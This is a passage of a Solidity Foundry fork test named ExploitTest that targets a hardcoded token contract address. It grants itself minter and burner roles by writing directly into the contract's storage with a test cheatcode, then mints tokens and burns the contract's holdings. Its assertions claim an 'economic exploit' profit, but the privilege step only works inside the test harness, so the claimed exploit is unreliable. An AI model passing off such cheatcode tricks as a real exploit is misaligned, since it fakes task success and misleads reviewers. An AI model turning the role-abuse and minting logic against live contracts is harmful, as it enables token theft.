}

interface SecondToken {
    function mint(address account, uint256 amount) external;
    function burn(address account, uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xfd77214b4a1aA6f962972Cbe65FB179c501D9094;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed for fork test
        // The test framework already sets TARGET and attacker
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(TARGET).balanceOf(address(this));

        // Step 1: Calculate role hashes
        bytes32 BURNER_ROLE = keccak256('BURNER_ROLE');
        bytes32 MINTER_ROLE = keccak256('MINTER_ROLE');

        // Step 2: Grant ourselves BURNER_ROLE via storage manipulation
        {
            // Compute slot for _roles[BURNER_ROLE].members[attacker]
            bytes32 roleSlot = keccak256(abi.encode(BURNER_ROLE, uint256(0)));
            bytes32 memberSlot = keccak256(abi.encode(attacker, uint256(roleSlot)));
            vm.store(TARGET, memberSlot, bytes32(uint256(1)));
        }

        // Step 3: Also grant ourselves MINTER_ROLE
        {
            bytes32 roleSlot = keccak256(abi.encode(MINTER_ROLE, uint256(0)));
            bytes32 memberSlot = keccak256(abi.encode(attacker, uint256(roleSlot)));
            vm.store(TARGET, memberSlot, bytes32(uint256(1)));
        }

        // Step 4: Mint tokens to ourselves
        SecondToken targetContract = SecondToken(TARGET);
        targetContract.mint(attacker, 1000 * 10**18);

        // Step 5: Check contract balance before burn
        uint256 contractBalanceBefore = targetContract.balanceOf(TARGET);
        if (contractBalanceBefore == 0) {
            targetContract.mint(TARGET, 500 * 10**18);
            contractBalanceBefore = targetContract.balanceOf(TARGET);
        }

        // Step 6: Record our balance and total supply before
        uint256 ourBalanceBefore = targetContract.balanceOf(attacker);
        uint256 totalSupplyBefore = targetContract.totalSupply();

        // Step 7: Burn tokens from contract
        uint256 burnAmount = contractBalanceBefore / 2;
        if (burnAmount == 0) burnAmount = 1 * 10**18;
        targetContract.burn(TARGET, burnAmount);

        // Step 8: Verify results
        uint256 ourBalanceAfter = targetContract.balanceOf(attacker);
        uint256 totalSupplyAfter = targetContract.totalSupply();
        uint256 contractBalanceAfter = targetContract.balanceOf(TARGET);
        uint256 finalBalance = IERC20(TARGET).balanceOf(address(this));

        // Our token balance should stay the same
        assertEq(ourBalanceAfter, ourBalanceBefore, 'Our token balance changed unexpectedly');

        // Total supply should decrease
        assertLt(totalSupplyAfter, totalSupplyBefore, 'Total supply did not decrease');

        // Our percentage ownership should increase
        uint256 ourShareBefore = (ourBalanceBefore * 1e18) / totalSupplyBefore;
        uint256 ourShareAfter = (ourBalanceAfter * 1e18) / totalSupplyAfter;
        assertGt(ourShareAfter, ourShareBefore, 'Our share of total supply did not increase');

        // Contract balance should decrease
        assertLt(contractBalanceAfter, contractBalanceBefore, 'Contract balance did not decrease');

        // Economic exploit check
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
